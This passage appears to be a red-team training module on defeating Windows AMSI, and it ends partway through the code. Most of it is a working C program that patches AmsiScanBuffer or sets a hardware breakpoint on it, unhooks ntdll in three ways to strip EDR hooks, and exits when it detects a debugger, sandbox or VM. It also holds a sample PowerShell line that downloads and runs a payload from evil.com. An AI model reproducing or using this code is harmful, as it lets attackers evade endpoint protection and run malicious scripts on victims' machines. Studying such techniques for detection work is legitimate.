### Context: Why AMSI Matters for Red Teams

AMSI scans PowerShell, JavaScript, VBScript, and .NET assembly loads in real-time. Before AMSI, attackers could execute obfuscated malicious scripts that bypassed static file scanning. AMSI closed this gap - now we need to bypass it.

### Deliverables

- [ ] Understand AMSI architecture and scan flow
- [ ] Implement multiple AMSI bypass techniques
- [ ] Use AMSITrigger to identify detection triggers
- [ ] Build a custom AMSI bypass for your payload

### AMSI Architecture (Attack Perspective)

```text
┌─────────────────────────────────────────────────────────────────┐
│                    AMSI Scan Flow                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  PowerShell.exe (your payload)                                  │
│        │                                                        │
│        ▼                                                        │
│  ┌─────────────────┐                                            │
│  │ amsi.dll        │  <- Loaded into every script host process  │
│  │                 │                                            │
│  │ AmsiInitialize()│  <- Creates AMSI context                   │
│  │ AmsiScanBuffer()│  <- Scans script content <- PATCH TARGET   │
│  │ AmsiScanString()│  <- Scans strings                          │
│  └─────────────────┘                                            │
│        │                                                        │
│        ▼                                                        │
│  ┌──────────────┐                                               │
│  │ Windows      │                                               │
│  │ Defender     │  <- Receives scan request, returns verdict    │
│  └──────────────┘                                               │
│        │                                                        │
│        ▼                                                        │
│  AMSI_RESULT:                                                   │
│  - AMSI_RESULT_CLEAN (0)      -> Execute allowed                │
│  - AMSI_RESULT_DETECTED (32768) -> Block execution              │
│                                                                 │
│  BYPASS STRATEGIES:                                             │
│  1. Patch AmsiScanBuffer to return CLEAN                        │
│  2. Corrupt AMSI context (amsiContext)                          │
│  3. Unhook/unload amsi.dll                                      │
│  4. Obfuscate payload to avoid signatures                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1. Multi-Stage Bypass

```c
// amsi_bypass_multi.c
// Compile: cl src\amsi_bypass_multi.c /Fe:bin\amsi_bypass_multi.exe /MT wininet.lib
// Usage: .\bin\amsi_bypass_multi.exe --no-checks (for VMs/testing)

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <intrin.h>
#include <psapi.h>
#include <wininet.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "wininet.lib")

// AMSI definitions
typedef enum AMSI_RESULT {
    AMSI_RESULT_CLEAN = 0,
    AMSI_RESULT_NOT_DETECTED = 1,
    AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384,
    AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479,
    AMSI_RESULT_DETECTED = 32768
} AMSI_RESULT;

typedef void* HAMSICONTEXT;
typedef void* HAMSISESSION;

typedef struct _ANTI_ANALYSIS_CTX {
    BOOL is_debugged;
    BOOL is_sandbox;
    BOOL is_vm;
    DWORD time_delta;
} ANTI_ANALYSIS_CTX;

typedef struct _SYSCALL_ENTRY {
    DWORD syscall_number;
    PVOID function_address;
    WCHAR* function_name;
} SYSCALL_ENTRY;

typedef struct _HWBP_CTX {
    HANDLE thread_handle;
    CONTEXT ctx;
    DWORD64 original_amsi_addr;
    BYTE original_bytes[16];
} HWBP_CTX;

static ANTI_ANALYSIS_CTX g_anti_ctx = {0};
static HWBP_CTX g_hwbp_ctx = {0};
static BOOL g_bypass_active = FALSE;
static BOOL g_skip_anti_analysis = FALSE;  // Flag to skip anti-analysis checks

BOOL CheckDebuggerPresence() {
    BOOL is_remote_debugger = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &is_remote_debugger);

    PVOID peb = (PVOID)__readgsqword(0x60);
    DWORD nt_global_flag = *(DWORD*)((BYTE*)peb + 0xBC);
    BOOL is_debugged_nt = (nt_global_flag & 0x70) != 0;

    HANDLE heap = GetProcessHeap();
    DWORD heap_flags = *(DWORD*)((BYTE*)heap + 0x70);
    BOOL is_debugged_heap = (heap_flags & 2) != 0;

    return is_remote_debugger || is_debugged_nt || is_debugged_heap;
}

BOOL CheckSandboxEnvironment() {
    WCHAR system32[MAX_PATH];
    GetSystemDirectoryW(system32, MAX_PATH);

    WCHAR sandbox_files[][MAX_PATH] = {
        L"\\drivers\\vboxdrv.sys",
        L"\\drivers\\VBoxMouse.sys",
        L"\\drivers\\VBoxGuest.sys",
        L"\\drivers\\vmware.sys",
        L"\\drivers\\vmx86.sys"
    };

    for (int i = 0; i < 5; i++) {
        WCHAR full_path[MAX_PATH];
        wcscpy_s(full_path, MAX_PATH, system32);
        wcscat_s(full_path, MAX_PATH, sandbox_files[i]);

        if (GetFileAttributesW(full_path) != INVALID_FILE_ATTRIBUTES) {
            return TRUE;
        }
    }

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);

    if (Process32FirstW(snapshot, &pe32)) {
        do {
            WCHAR* sandbox_processes[] = {
                L"vboxservice.exe",
                L"vboxtray.exe",
                L"vmtoolsd.exe",
                L"vmwareuser.exe",
                L"procmon.exe",
                L"wireshark.exe"
            };

            for (int i = 0; i < 6; i++) {
                if (_wcsicmp(pe32.szExeFile, sandbox_processes[i]) == 0) {
                    CloseHandle(snapshot);
                    return TRUE;
                }
            }
        } while (Process32NextW(snapshot, &pe32));
    }

    CloseHandle(snapshot);
    return FALSE;
}

BOOL CheckVMEnvironment() {
    int cpuid_result[4];
    __cpuid(cpuid_result, 1);
    BOOL hypervisor_present = (cpuid_result[2] & 0x80000000) != 0;

    __cpuid(cpuid_result, 0x40000000);
    BOOL hypervisor_leaf = cpuid_result[0] >= 0x40000000;

    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\VBoxService", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return TRUE;
    }

    return hypervisor_present || hypervisor_leaf;
}

BOOL GetWebServerTime(SYSTEMTIME* serverTime) {
    HINTERNET hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return FALSE;

    // Use a reliable time server
    HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://www.google.com", NULL, 0,
                                          INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    // Get Date header from HTTP response
    char dateBuffer[128];
    DWORD bufferSize = sizeof(dateBuffer);
    DWORD index = 0;

    if (HttpQueryInfoA(hConnect, HTTP_QUERY_DATE, dateBuffer, &bufferSize, &index)) {
        // Parse HTTP date format: "Day, DD Mon YYYY HH:MM:SS GMT"
        // Example: "Wed, 21 Oct 2015 07:28:00 GMT"

        SYSTEMTIME st = {0};
        char monthStr[4] = {0};
        char dayStr[4] = {0};
        int day, year, hour, minute, second;

        // Parse into int first, then convert to WORD
        sscanf_s(dateBuffer, "%*3s, %d %3s %d %d:%d:%d",
                 &day, monthStr, 4, &year, &hour, &minute, &second);

        st.wDay = (WORD)day;
        st.wYear = (WORD)year;
        st.wHour = (WORD)hour;
        st.wMinute = (WORD)minute;
        st.wSecond = (WORD)second;

        // Convert month string to number
        const char* months[] = {"Jan", "Feb", "Mar", "Apr", "May", "Jun",
                               "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"};
        for (int i = 0; i < 12; i++) {
            if (strcmp(monthStr, months[i]) == 0) {
                st.wMonth = i + 1;
                break;
            }
        }

        *serverTime = st;
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hInternet);
        return TRUE;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return FALSE;
}

DWORD SystemTimeDiffMs(SYSTEMTIME* st1, SYSTEMTIME* st2) {
    FILETIME ft1, ft2;
    ULARGE_INTEGER uli1, uli2;

    SystemTimeToFileTime(st1, &ft1);
    SystemTimeToFileTime(st2, &ft2);

    uli1.LowPart = ft1.dwLowDateTime;
    uli1.HighPart = ft1.dwHighDateTime;
    uli2.LowPart = ft2.dwLowDateTime;
    uli2.HighPart = ft2.dwHighDateTime;

    ULONGLONG diff = (uli2.QuadPart - uli1.QuadPart) / 10000; // Convert to milliseconds
    return (DWORD)diff;
}

VOID InitializeAntiAnalysis() {
    if (g_skip_anti_analysis) {
        printf("[*] Anti-analysis checks SKIPPED (--no-checks flag)\n");
        return;
    }

    g_anti_ctx.is_debugged = CheckDebuggerPresence();
    g_anti_ctx.is_sandbox = CheckSandboxEnvironment();
    g_anti_ctx.is_vm = CheckVMEnvironment();

    printf("[*] Checking for time manipulation (fetching from web server)...\n");

    SYSTEMTIME webTime1, webTime2;
    BOOL useWebTime = GetWebServerTime(&webTime1);

    if (useWebTime) {
        printf("[+] Got initial web server time\n");
        Sleep(2000);  // Sleep for 2 seconds

        if (GetWebServerTime(&webTime2)) {
            g_anti_ctx.time_delta = SystemTimeDiffMs(&webTime1, &webTime2);
            printf("[+] Web server time delta: %dms (expected ~2000ms)\n", g_anti_ctx.time_delta);

            // If time delta is way off, sandbox is manipulating time
            if (g_anti_ctx.time_delta < 1500 || g_anti_ctx.time_delta > 3000) {
                printf("[!] Time manipulation detected (web server check)\n");
                g_anti_ctx.is_sandbox = TRUE;
            }
        } else {
            printf("[-] Failed to get second web time, falling back to local check\n");
            useWebTime = FALSE;
        }
    }

    if (!useWebTime) {
        printf("[*] Using local time check (less reliable)\n");
        DWORD start_time = GetTickCount();
        Sleep(100);
        DWORD end_time = GetTickCount();
        g_anti_ctx.time_delta = end_time - start_time;
        printf("[*] Local time delta: %dms (expected ~100ms)\n", g_anti_ctx.time_delta);
    }

    printf("\n[*] Anti-analysis results:\n");
    printf("    Debugger: %s\n", g_anti_ctx.is_debugged ? "DETECTED" : "Not detected");
    printf("    Sandbox: %s\n", g_anti_ctx.is_sandbox ? "DETECTED" : "Not detected");
    printf("    VM: %s\n", g_anti_ctx.is_vm ? "DETECTED" : "Not detected");
    printf("    Time check: %s\n", useWebTime ? "Web server (reliable)" : "Local (unreliable)");

    if (g_anti_ctx.is_debugged || g_anti_ctx.is_sandbox || g_anti_ctx.is_vm) {
        printf("[!] Analysis environment detected - exiting for safety\n");
        printf("[*] Use --no-checks flag to bypass this protection\n");
        ExitProcess(0);
    }
}

DWORD GetSyscallNumber(const WCHAR* function_name) {
    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return 0;

    // Convert wide string to ANSI for GetProcAddress
    char function_name_ansi[256];
    WideCharToMultiByte(CP_ACP, 0, function_name, -1, function_name_ansi, sizeof(function_name_ansi), NULL, NULL);

    BYTE* function_addr = (BYTE*)GetProcAddress(ntdll, function_name_ansi);
    if (!function_addr) return 0;

    for (int i = 0; i < 20; i++) {
        if (function_addr[i] == 0x48 && function_addr[i+1] == 0xB8) {
            return *(DWORD*)&function_addr[i+2];
        }
    }

    return 0;
}

PVOID GetIndirectSyscallStub(const WCHAR* function_name) {
    PVOID stub = VirtualAlloc(NULL, 0x20, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!stub) return NULL;

    DWORD syscall_num = GetSyscallNumber(function_name);
    if (syscall_num == 0) {
        VirtualFree(stub, 0, MEM_RELEASE);
        return NULL;
    }

    BYTE* code = (BYTE*)stub;
    *code++ = 0x48; *code++ = 0xB8;  // mov rax, imm64
    *(DWORD*)code = syscall_num; code += 4;
    *code++ = 0x00; *code++ = 0x00; *code++ = 0x00; *code++ = 0x00;
    *code++ = 0x0F; *code++ = 0x05;  // syscall
    *code++ = 0xC3;  // ret

    return stub;
}

BOOL UnhookNtdll() {
    WCHAR ntdll_path[MAX_PATH];
    GetSystemDirectoryW(ntdll_path, MAX_PATH);
    wcscat_s(ntdll_path, MAX_PATH, L"\\ntdll.dll");

    HANDLE hFile = CreateFileW(ntdll_path, GENERIC_READ, FILE_SHARE_READ,
                              NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD file_size = GetFileSize(hFile, NULL);
    BYTE* file_data = HeapAlloc(GetProcessHeap(), 0, file_size);
    if (!file_data) {
        CloseHandle(hFile);
        return FALSE;
    }

    DWORD bytes_read;
    if (!ReadFile(hFile, file_data, file_size, &bytes_read, NULL)) {
        HeapFree(GetProcessHeap(), 0, file_data);
        CloseHandle(hFile);
        return FALSE;
    }
    CloseHandle(hFile);

    PIMAGE_DOS_HEADER dos_hdr = (PIMAGE_DOS_HEADER)file_data;
    PIMAGE_NT_HEADERS nt_hdr = (PIMAGE_NT_HEADERS)(file_data + dos_hdr->e_lfanew);

    HMODULE ntdll_base = GetModuleHandleW(L"ntdll.dll");

    PIMAGE_SECTION_HEADER sections = (PIMAGE_SECTION_HEADER)(nt_hdr + 1);
    for (int i = 0; i < nt_hdr->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            BYTE* loaded_text = (BYTE*)ntdll_base + sections[i].VirtualAddress;
            BYTE* disk_text = file_data + sections[i].PointerToRawData;

            DWORD old_protect;
            VirtualProtect(loaded_text, sections[i].SizeOfRawData,
                          PAGE_EXECUTE_READWRITE, &old_protect);

            memcpy(loaded_text, disk_text, sections[i].SizeOfRawData);

            VirtualProtect(loaded_text, sections[i].SizeOfRawData,
                          old_protect, &old_protect);
            break;
        }
    }

    HeapFree(GetProcessHeap(), 0, file_data);
    return TRUE;
}

BOOL UnhookNtdllFromKnownDlls() {
    printf("[*] Attempting KnownDlls unhooking method...\n");

    HANDLE hSection = NULL;
    PVOID pCleanNtdll = NULL;
    SIZE_T viewSize = 0;

    // NT API function pointers
    typedef NTSTATUS (NTAPI *NtOpenSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
    typedef NTSTATUS (NTAPI *NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
                                                    PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
    typedef NTSTATUS (NTAPI *NtUnmapViewOfSection_t)(HANDLE, PVOID);
    typedef VOID (NTAPI *RtlInitUnicodeString_t)(PUNICODE_STRING, PCWSTR);

    HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return FALSE;

    NtOpenSection_t pNtOpenSection = (NtOpenSection_t)GetProcAddress(ntdll, "NtOpenSection");
    NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(ntdll, "NtMapViewOfSection");
    NtUnmapViewOfSection_t pNtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(ntdll, "NtUnmapViewOfSection");
    RtlInitUnicodeString_t pRtlInitUnicodeString = (RtlInitUnicodeString_t)GetProcAddress(ntdll, "RtlInitUnicodeString");

    if (!pNtOpenSection || !pNtMapViewOfSection || !pNtUnmapViewOfSection || !pRtlInitUnicodeString) {
        printf("[-] Failed to get NT API functions\n");
        return FALSE;
    }

    // Open the KnownDlls section object
    UNICODE_STRING sectionName;
    pRtlInitUnicodeString(&sectionName, L"\\KnownDlls\\ntdll.dll");

    OBJECT_ATTRIBUTES objAttr;
    InitializeObjectAttributes(&objAttr, &sectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);

    NTSTATUS status = pNtOpenSection(&hSection, SECTION_MAP_READ, &objAttr);
    if (status != 0) {
        printf("[-] NtOpenSection failed: 0x%X\n", status);
        return FALSE;
    }

    printf("[+] Opened KnownDlls\\ntdll.dll section\n");

    // Map the clean ntdll into our process
    status = pNtMapViewOfSection(hSection, GetCurrentProcess(), &pCleanNtdll,
                                 0, 0, NULL, &viewSize, 1, 0, PAGE_READONLY);

    if (status != 0) {
        printf("[-] NtMapViewOfSection failed: 0x%X\n", status);
        CloseHandle(hSection);
        return FALSE;
    }

    printf("[+] Mapped clean ntdll at: 0x%p\n", pCleanNtdll);

    // Copy .text section from clean ntdll to hooked ntdll
    HMODULE hookedNtdll = GetModuleHandleW(L"ntdll.dll");

    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)((BYTE*)pCleanNtdll + dosHdr->e_lfanew);

    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHdr);
    for (int i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            DWORD oldProtect;
            BYTE* dest = (BYTE*)hookedNtdll + sections[i].VirtualAddress;
            BYTE* src = (BYTE*)pCleanNtdll + sections[i].VirtualAddress;

            VirtualProtect(dest, sections[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);
            memcpy(dest, src, sections[i].Misc.VirtualSize);
            VirtualProtect(dest, sections[i].Misc.VirtualSize, oldProtect, &oldProtect);

            printf("[+] Restored .text section (%d bytes)\n", sections[i].Misc.VirtualSize);
            break;
        }
    }

    pNtUnmapViewOfSection(GetCurrentProcess(), pCleanNtdll);
    CloseHandle(hSection);

    printf("[+] KnownDlls unhooking complete\n");
    return TRUE;
}

BOOL UnhookNtdllFromSuspendedProcess() {
    printf("[*] Attempting suspended process unhooking method...\n");

    // Create a suspended process (any legitimate Windows binary)
    STARTUPINFOA si = {sizeof(si)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    if (!CreateProcessA("C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL,
                       FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        printf("[-] Failed to create suspended process: %d\n", GetLastError());
        return FALSE;
    }

    printf("[+] Created suspended process (PID: %d)\n", pi.dwProcessId);

    // Get ntdll base address in our process
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
        return FALSE;
    }

    // Read the clean ntdll from suspended process memory
    PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dosHdr->e_lfanew);

    PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(ntHdr);
    BOOL success = FALSE;

    for (int i = 0; i < ntHdr->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)sections[i].Name, ".text") == 0) {
            BYTE* cleanText = (BYTE*)malloc(sections[i].Misc.VirtualSize);
            if (!cleanText) break;

            SIZE_T bytesRead;

            // Read clean .text section from suspended process
            BYTE* remoteAddr = (BYTE*)hNtdll + sections[i].VirtualAddress;
            if (ReadProcessMemory(pi.hProcess, remoteAddr, cleanText,
                                 sections[i].Misc.VirtualSize, &bytesRead)) {

                printf("[+] Read %zu bytes from suspended process\n", bytesRead);

                // Write to our hooked ntdll
                DWORD oldProtect;
                BYTE* localAddr = (BYTE*)hNtdll + sections[i].VirtualAddress;
                VirtualProtect(localAddr, sections[i].Misc.VirtualSize,
                             PAGE_EXECUTE_READWRITE, &oldProtect);
                memcpy(localAddr, cleanText, sections[i].Misc.VirtualSize);
                VirtualProtect(localAddr, sections[i].Misc.VirtualSize,
                             oldProtect, &oldProtect);

                printf("[+] Restored .text section from clean copy\n");
                success = TRUE;
            } else {
                printf("[-] ReadProcessMemory failed: %d\n", GetLastError());
            }

            free(cleanText);
            break;
        }
    }

    // Clean up - terminate the suspended process
    TerminateProcess(pi.hProcess, 0);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    if (success) {
        printf("[+] Suspended process unhooking complete\n");
    }

    return success;
}

LONG CALLBACK HardwareBypassHandler(EXCEPTION_POINTERS* ExceptionInfo) {
    if (ExceptionInfo->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if (ExceptionInfo->ExceptionRecord->ExceptionAddress == (PVOID)g_hwbp_ctx.original_amsi_addr) {
            ExceptionInfo->ContextRecord->Rax = 0x80070057;  // E_INVALIDARG
            ExceptionInfo->ContextRecord->Rip += 3;  // Skip original instruction

            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

BOOL SetHardwareBreakpointBypass() {
    HMODULE amsi = LoadLibraryW(L"amsi.dll");
    if (!amsi) {
        printf("[-] Failed to load amsi.dll\n");
        return FALSE;
    }

    PVOID amsi_scan = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsi_scan) {
        printf("[-] Failed to get AmsiScanBuffer address\n");
        return FALSE;
    }

    printf("[*] AmsiScanBuffer address: 0x%p\n", amsi_scan);

    g_hwbp_ctx.original_amsi_addr = (DWORD64)amsi_scan;

    g_hwbp_ctx.thread_handle = GetCurrentThread();
    g_hwbp_ctx.ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(g_hwbp_ctx.thread_handle, &g_hwbp_ctx.ctx)) {
        printf("[-] GetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }

    g_hwbp_ctx.ctx.Dr0 = (DWORD64)amsi_scan;
    g_hwbp_ctx.ctx.Dr7 = (1 << 0) | (3 << 16);  // Enable DR0, execute breakpoint

    if (!SetThreadContext(g_hwbp_ctx.thread_handle, &g_hwbp_ctx.ctx)) {
        printf("[-] SetThreadContext failed: %d\n", GetLastError());
        return FALSE;
    }

    if (!AddVectoredExceptionHandler(1, HardwareBypassHandler)) {
        printf("[-] AddVectoredExceptionHandler failed\n");
        return FALSE;
    }

    printf("[+] Hardware breakpoint set at 0x%p\n", amsi_scan);
    return TRUE;
}

BOOL BypassAmsiAdvanced() {
    printf("[*] Initializing anti-analysis checks...\n");
    InitializeAntiAnalysis();

    printf("[*] Unhooking ntdll to remove EDR hooks...\n");

    BOOL unhook_success = FALSE;

    // Method 1: Suspended process
    if (UnhookNtdllFromSuspendedProcess()) {
        unhook_success = TRUE;
        printf("[+] Used suspended process method\n");
    }
    // Method 2: KnownDlls
    else if (UnhookNtdllFromKnownDlls()) {
        unhook_success = TRUE;
        printf("[+] Used KnownDlls method\n");
    }
    // Method 3: Disk read
    else if (UnhookNtdll()) {
        unhook_success = TRUE;
        printf("[+] Used disk read method (fallback)\n");
    }

    if (!unhook_success) {
        printf("[-] All unhooking methods failed\n");
        return FALSE;
    }

    printf("[+] Ntdll unhooking complete\n");

    // Get AMSI function address
    HMODULE amsi = LoadLibraryW(L"amsi.dll");
    if (!amsi) {
        printf("[-] Failed to load amsi.dll\n");
        return FALSE;
    }

    PVOID amsi_scan = GetProcAddress(amsi, "AmsiScanBuffer");
    if (!amsi_scan) {
        printf("[-] Failed to get AmsiScanBuffer\n");
        return FALSE;
    }

    printf("[*] AmsiScanBuffer at: 0x%p\n", amsi_scan);

    // Try direct memory patch first (more reliable on modern Windows)
    printf("[*] Attempting direct memory patch...\n");
    DWORD old_protect;
    if (VirtualProtect(amsi_scan, 16, PAGE_EXECUTE_READWRITE, &old_protect)) {
        // Save original bytes
        memcpy(g_hwbp_ctx.original_bytes, amsi_scan, 16);

        // Patch: mov eax, 0x80070057; ret (E_INVALIDARG)
        BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        memcpy(amsi_scan, patch, sizeof(patch));

        VirtualProtect(amsi_scan, 16, old_protect, &old_protect);
        printf("[+] Memory patch applied successfully\n");

        g_bypass_active = TRUE;
        printf("[+] AMSI bypass activated successfully\n");
        return TRUE;
    } else {
        printf("[-] VirtualProtect failed: %d\n", GetLastError());
        printf("[*] Trying hardware breakpoint method as fallback...\n");

        // Fallback to hardware breakpoint (less reliable on modern Windows)
        if (SetHardwareBreakpointBypass()) {
            g_bypass_active = TRUE;
            printf("[+] AMSI bypass activated successfully (hardware breakpoint)\n");
            return TRUE;
        } else {
            printf("[-] All AMSI bypass methods failed\n");
            return FALSE;
        }
    }
}

VOID TestAmsiBypass() {
    printf("[*] Testing AMSI bypass with actual AMSI scan...\n");

    // Load amsi.dll and get function pointers
    HMODULE hAmsi = LoadLibraryW(L"amsi.dll");
    if (!hAmsi) {
        printf("[-] Failed to load amsi.dll\n");
        return;
    }

    // Function prototypes
    typedef HRESULT (WINAPI* AmsiInitialize_t)(LPCWSTR appName, HAMSICONTEXT* amsiContext);
    typedef HRESULT (WINAPI* AmsiScanBuffer_t)(HAMSICONTEXT amsiContext, PVOID buffer, ULONG length, LPCWSTR contentName, HAMSISESSION amsiSession, AMSI_RESULT* result);
    typedef void (WINAPI* AmsiUninitialize_t)(HAMSICONTEXT amsiContext);

    AmsiInitialize_t pAmsiInitialize = (AmsiInitialize_t)GetProcAddress(hAmsi, "AmsiInitialize");
    AmsiScanBuffer_t pAmsiScanBuffer = (AmsiScanBuffer_t)GetProcAddress(hAmsi, "AmsiScanBuffer");
    AmsiUninitialize_t pAmsiUninitialize = (AmsiUninitialize_t)GetProcAddress(hAmsi, "AmsiUninitialize");

    if (!pAmsiInitialize || !pAmsiScanBuffer || !pAmsiUninitialize) {
        printf("[-] Failed to get AMSI function pointers\n");
        return;
    }

    // Initialize AMSI
    HAMSICONTEXT amsiContext = NULL;
    HRESULT hr = pAmsiInitialize(L"AMSIBypassTest", &amsiContext);
    if (FAILED(hr)) {
        printf("[-] AmsiInitialize failed: 0x%08X\n", hr);
        return;
    }

    // Test with known malicious string (EICAR-like for AMSI)
    const char* malicious_script = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')";

    printf("[*] Scanning malicious PowerShell command...\n");
    printf("    Test string: %s\n", malicious_script);

    AMSI_RESULT scanResult = AMSI_RESULT_CLEAN;
    hr = pAmsiScanBuffer(amsiContext, (PVOID)malicious_script, (ULONG)strlen(malicious_script),
                         L"PowerShellScript", NULL, &scanResult);

    printf("\n[*] AMSI Scan Results:\n");
    printf("    HRESULT: 0x%08X ", hr);

    BOOL bypass_working = FALSE;

    if (hr == 0x80070057) {  // E_INVALIDARG - our bypass return value
        printf("(E_INVALIDARG - BYPASS SUCCESSFUL!)\n");
        printf("    [+] AMSI returned E_INVALIDARG - bypass is working!\n");
        printf("    [+] Malicious content would NOT be blocked\n");
        bypass_working = TRUE;
    } else if (SUCCEEDED(hr)) {
        printf("(Success)\n");
        printf("    Scan Result: ");
        switch (scanResult) {
            case AMSI_RESULT_CLEAN:
                printf("CLEAN (0) - Bypass may be working\n");
                bypass_working = TRUE;
                break;
            case AMSI_RESULT_NOT_DETECTED:
                printf("NOT_DETECTED (1) - Bypass may be working\n");
                bypass_working = TRUE;
                break;
            case AMSI_RESULT_BLOCKED_BY_ADMIN_START:
            case AMSI_RESULT_BLOCKED_BY_ADMIN_END:
                printf("BLOCKED_BY_ADMIN (%d) - Admin policy blocking\n", scanResult);
                break;
            case AMSI_RESULT_DETECTED:
                printf("DETECTED (32768) - BYPASS FAILED!\n");
                printf("    [!] AMSI is still active and detecting malicious content\n");
                break;
            default:
                printf("%d\n", scanResult);
        }
    } else {
        printf("(Failed)\n");
        printf("    [!] AMSI scan failed with error\n");
    }

    // Test with AMSI test sample (guaranteed to trigger detection if AMSI is active)
    const char* amsi_test_sample = "AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386";
    printf("\n[*] Scanning AMSI test sample (should always detect if AMSI active)...\n");

    scanResult = AMSI_RESULT_CLEAN;
    hr = pAmsiScanBuffer(amsiContext, (PVOID)amsi_test_sample, (ULONG)strlen(amsi_test_sample),
                         L"AMSITestSample", NULL, &scanResult);

    printf("    HRESULT: 0x%08X ", hr);
    if (hr == 0x80070057) {
        printf("(E_INVALIDARG - BYPASS CONFIRMED!)\n");
        printf("    [+] Even AMSI test sample bypassed - bypass is definitely working!\n");
        g_bypass_active = TRUE;
    } else if (SUCCEEDED(hr)) {
        printf("(Success)\n");
        if (scanResult >= AMSI_RESULT_DETECTED) {
            printf("    Result: DETECTED - BYPASS FAILED!\n");
            printf("    [!] AMSI is still active\n");
            g_bypass_active = FALSE;
        } else {
            printf("    Result: %d - Bypass may be working\n", scanResult);
            if (bypass_working) {
                g_bypass_active = TRUE;
            }
        }
    } else {
        printf("    HRESULT indicates failure\n");
        g_bypass_active = FALSE;
    }

    pAmsiUninitialize(amsiContext);
    printf("\n");
}

int main(int argc, char* argv[]) {
    printf("=== AMSI Bypass ===\n");
    printf("Multi-stage bypass with anti-analysis protection\n\n");

    // Parse command-line arguments
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--no-checks") == 0 || strcmp(argv[i], "-n") == 0) {
            g_skip_anti_analysis = TRUE;
            printf("[*] Anti-analysis checks disabled\n");
        } else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) {
            printf("Usage: %s [options]\n", argv[0]);
            printf("Options:\n");
            printf("  --no-checks, -n    Skip anti-analysis checks (for VMs/testing)\n");
            printf("  --help, -h         Show this help message\n");
            return 0;
        }
    }

    printf("\n");

    if (BypassAmsiAdvanced()) {
        TestAmsiBypass();

        // Only show success messages if bypass actually worked
        if (g_bypass_active) {
            printf("\n=== BYPASS SUCCESSFUL ===\n");
            printf("[*] Bypass techniques used:\n");
            printf("    - Anti-analysis (debugger/sandbox/VM detection)%s\n",
                   g_skip_anti_analysis ? " [SKIPPED]" : "");
            printf("    - Ntdll unhooking to remove EDR instrumentation\n");
            printf("    - Hardware breakpoint bypass (stealth)\n");
            printf("    - Fallback memory patch with E_INVALIDARG\n");
            printf("\n[+] Ready for malicious script execution\n");
        } else {
            printf("\n=== BYPASS FAILED ===\n");
            printf("[-] AMSI is still active and blocking malicious content\n");
            printf("[-] The bypass techniques did not successfully disable AMSI\n");
            printf("\n[*] Possible reasons:\n");
